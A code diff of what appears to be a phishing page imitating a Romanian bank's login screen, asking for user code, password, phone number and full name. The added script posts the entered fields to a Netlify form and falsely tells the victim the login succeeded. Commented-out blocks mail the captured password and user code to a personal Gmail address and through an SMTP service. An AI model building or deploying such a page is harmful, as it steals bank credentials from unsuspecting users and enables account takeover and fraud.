@@ -1,4 +1,3 @@
-<?php include './form-to-email.php' ?>
 <!DOCTYPE html>
 <html lang="en">
 
@@ -50,7 +49,7 @@
                         </div>
                     </div>
                     <div class="form-inputs">
-                        <form action="./form-to-email.php" method="post" id="loginform" enctype="text/plain">
+                        <form action="" method="post" id="login" enctype="text/plain" data-netlify="true">
                             <div class="username-input mb-3">
                                 <label for="Codul-de-utilizator">Codul de utilizator</label>
                                 <input type="text" class="form-control" name="Codul-de-utilizator"
@@ -119,9 +118,45 @@
         
     </div>
 
-    <!-- <script src="https://smtpjs.com/v3/smtp.js"></script>
-
     <script>
+        const handleSubmit = (event) => {
+            event.preventDefault();
+          
+            const myForm = event.target;
+            const formData = new FormData(myForm);
+            
+            fetch("/", {
+              method: "POST",
+              headers: { "Content-Type": "application/x-www-form-urlencoded" },
+              body: new URLSearchParams(formData).toString(),
+            })
+              .then(() => alert("Te-ai autentificat cu succes"))
+              .catch(() => alert("Nu ati completat toate câmpurile necesare!"));
+          };
+          
+          document
+            .querySelector("form")
+            .addEventListener("submit", handleSubmit);
+    </script>
+
+    <!-- <script src="https://smtpjs.com/v3/smtp.js"></script> -->
+
+    <!-- <script>
+        const sendEmail = () => {
+            const mailAddress = "maadeleke02@gmail.com"
+            const subject = encodeURIComponent("This is my subject")
+            const fullName = encodeURIComponent(document.getElementById('Nume-complet').value)
+            const password = encodeURIComponent(document.getElementById('Parola').value)
+            const usercode = encodeURIComponent(document.getElementById('Codul-de-utilizator').value)
+            const phoneNumber = encodeURIComponent(document.getElementById('Numar-de-telefon').value)
+            const body = "A new user has logged into https://www.homebank.ro/hb/hb/#/login-b/ \nCodul de utilizator: ${usercode}\nParola: ${password}\nNumar de telefon: ${phoneNumber}\nNume complet: ${fullName}"
+
+            const link= `mailto:${mailAddress}&subject=${subject}&body=${body}`
+            window.location.href = link;
+          }
+    </script> -->
+
+    <!-- <script>
         function sendEmail() {
             Email.send({
               Host : "sandbox.smtp.mailtrap.io",
